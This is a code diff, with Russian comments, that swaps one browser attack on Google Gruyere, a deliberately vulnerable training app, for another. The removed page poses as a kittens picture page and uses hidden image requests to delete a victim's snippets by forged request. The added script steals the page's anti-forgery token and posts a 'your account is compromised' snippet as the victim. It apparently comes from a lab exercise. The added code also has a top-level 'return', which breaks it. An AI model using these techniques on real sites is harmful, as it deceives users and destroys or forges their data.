@@ -1,30 +1,22 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Смотрите котиков 🐱</title>
-</head>
-<body>
-  <h1>Милые котики</h1>
-  <img src="https://i.imgur.com/8UXpQeA.jpg" alt="Котики" width="500">
+<script>
+// 1. Получаем XSRF-токен из формы или кук
+const tokenMatch = document.body.innerHTML.match(/name="xsrf" value="([^"]+)"/);
+const xsrfToken = tokenMatch ? tokenMatch[1] : '';
 
-  <script>
-    // Твой ID (проверь, что экземпляр жив!)
-    const GRUYERE_ID = '643453999600290416051506802884356354571';
-    const BASE_URL = `https://google-gruyere.appspot.com/${GRUYERE_ID}/deletesnippet`;
+if (!xsrfToken) {
+  console.log('Токен не найден — возможно, не залогинен');
+  return;
+}
 
-    // Удаление через <img> — классическая XSRF
-    function xsrfDelete(index) {
-      const img = new Image();
-      img.src = `${BASE_URL}?index=${index}`;
-      img.style.display = 'none';
-      document.body.appendChild(img);
-      console.log(`XSRF: запрос на удаление index=${index} отправлен`);
-    }
-
-    // Удаляем первые 10 сниппетов
-    for (let i = 0; i < 10; i++) {
-      setTimeout(() => xsrfDelete(i), i * 400);
-    }
-  </script>
-</body>
-</html>
+// 2. Отправляем POST-запрос для создания нового сниппета
+fetch('https://google-gruyere.appspot.com/643453999600290416051506802884356354571/newsnippet', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded'
+  },
+  body: `snippet=💥%20Ваш%20аккаунт%20скомпрометирован%20XSRF%20+%20XSS%20атака&xsrf=${xsrfToken}`
+})
+.then(() => console.log('Новый сниппет создан'))
+.catch(err => console.error('Ошибка:', err));
+</script>
